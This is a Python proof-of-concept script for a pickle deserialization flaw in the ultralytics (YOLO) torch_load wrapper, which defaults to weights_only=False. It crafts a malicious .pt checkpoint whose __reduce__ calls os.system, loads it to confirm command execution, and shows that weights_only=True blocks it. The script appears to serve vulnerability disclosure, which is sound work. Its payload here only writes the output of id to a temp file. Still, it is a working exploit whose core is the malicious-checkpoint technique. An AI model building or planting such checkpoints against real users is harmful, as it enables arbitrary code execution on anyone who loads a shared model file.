#!/usr/bin/env python3
"""
UltraPickle — ultralytics (YOLO) `torch_load()` arbitrary code execution
via `weights_only=False` deserialization (CWE-502). Corroborated by
CVE-2026-118613 (ZDI-CAN-29652), which remains UNPATCHED: the only "fix"
(PR #24829) is an OPT-IN `ULTRALYTICS_SAFE_LOAD` env flag, and the DEFAULT
loading path still sets `weights_only=False`.

Root cause — `ultralytics/utils/patches.py` wraps `torch.load` and forces the
UNSAFE mode, overriding PyTorch 2.6+'s safe `weights_only=True` default:

    def torch_load(*args, **kwargs):
        from ultralytics.utils.torch_utils import TORCH_1_13
        if TORCH_1_13 and "weights_only" not in kwargs:
            kwargs["weights_only"] = False   # <-- arbitrary pickle execution
        return torch.load(*args, **kwargs)

Every `YOLO("model.pt")` / `torch_load("model.pt")` therefore unpickles the
checkpoint with `weights_only=False`.  A `.pt` file is a pickle, so a crafted
checkpoint whose `__reduce__` returns `(os.system, ("cmd",))` executes that
command when loaded — no warning, no allow-list, in the default configuration.

This PoC builds a malicious `.pt` and shows the exact differential:
`torch.load(..., weights_only=False)` (ultralytics default) runs the payload,
while `torch.load(..., weights_only=True)` (the opt-in flag) blocks it.
"""
import os
import subprocess
import sys

PWNED = "/tmp/opencode/ultrapickle_PWNED"


def ensure_torch():
    try:
        import torch  # noqa: F401
        return
    except ImportError:
        print("[*] installing torch (CPU) ...")
        subprocess.run(
            [sys.executable, "-m", "pip", "install", "--quiet", "--break-system-packages",
             "--no-cache-dir", "torch", "--index-url", "https://download.pytorch.org/whl/cpu"],
            check=True,
        )


def main():
    ensure_torch()
    import torch

    # ---- the vulnerable code, verbatim from ultralytics/utils/patches.py ----
    VULN = '''def torch_load(*args, **kwargs):
    """Load a PyTorch object with `weights_only=False` by default so full checkpoints can be unpickled."""
    from ultralytics.utils.torch_utils import TORCH_1_13
    if TORCH_1_13 and "weights_only" not in kwargs:
        kwargs["weights_only"] = False          # <-- the flaw
    return torch.load(*args, **kwargs)'''
    print("[*] ultralytics vulnerable wrapper (utils/patches.py):")
    print("    " + VULN.replace("\n", "\n    "))
    print()

    # ---- build a malicious .pt: pickle __reduce__ -> os.system ----
    class Evil:
        def __reduce__(self):
            return (os.system, (f"id > {PWNED}",))

    torch.save(Evil(), "/tmp/opencode/ultrapickle_evil.pt")
    print("[*] wrote malicious checkpoint /tmp/opencode/ultrapickle_evil.pt")
    print()

    # ---- DEFAULT ultralytics behavior: weights_only=False ----
    if os.path.exists(PWNED):
        os.remove(PWNED)
    print("=== torch.load(..., weights_only=False)  [ultralytics torch_load DEFAULT] ===")
    torch.load("/tmp/opencode/ultrapickle_evil.pt", weights_only=False)
    vulnerable_rce = os.path.exists(PWNED)
    if vulnerable_rce:
        print("[!] RCE CONFIRMED (default load): " + open(PWNED).read().strip())
    else:
        print("[-] no RCE (unexpected)")
    print()

    # ---- OPT-IN safe mode: weights_only=True (ULTRALYTICS_SAFE_LOAD=1) ----
    if os.path.exists(PWNED):
        os.remove(PWNED)
    print("=== torch.load(..., weights_only=True)   [opt-in ULTRALYTICS_SAFE_LOAD] ===")
    try:
        torch.load("/tmp/opencode/ultrapickle_evil.pt", weights_only=True)
    except Exception as e:
        print(f"[*] BLOCKED: {type(e).__name__}: {str(e).splitlines()[0][:80]}")
    if os.path.exists(PWNED):
        print("[!] still RCE (unexpected)")
    else:
        print("[*] no RCE — safe mode blocked the payload")
    print()

    if vulnerable_rce:
        print("[+] UltraPickle reproduced: default weights_only=False load -> code execution")
        return 0
    print("[-] failed to reproduce")
    return 1


if __name__ == "__main__":
    sys.exit(main())
